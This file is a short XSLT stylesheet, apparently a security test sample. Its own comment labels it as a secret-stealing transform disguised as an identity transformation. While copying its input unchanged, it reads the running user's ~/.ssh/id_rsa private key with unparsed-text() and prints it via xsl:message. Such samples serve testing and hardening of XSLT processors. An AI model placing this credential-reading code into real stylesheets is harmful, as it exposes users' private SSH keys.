<?xml version="1.0" encoding="UTF-8"?>
<!-- stealing a secret masked as the identity transformation -->
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:xs="http://www.w3.org/2001/XMLSchema" version="3.0">

    <xsl:mode on-no-match="shallow-copy"/>

    <xsl:template match="document-node()">
        <xsl:apply-templates/>
        <xsl:call-template name="read-key"/>
    </xsl:template>

    <xsl:template name="read-key">
        <xsl:variable name="key-file" select="concat(system-property('user.home'), '/.ssh/id_rsa')"/>
        <xsl:message>
            <xsl:text>Your private .ssh key: </xsl:text>
            <xsl:value-of select="unparsed-text($key-file)"/>
        </xsl:message>
    </xsl:template>

</xsl:stylesheet>
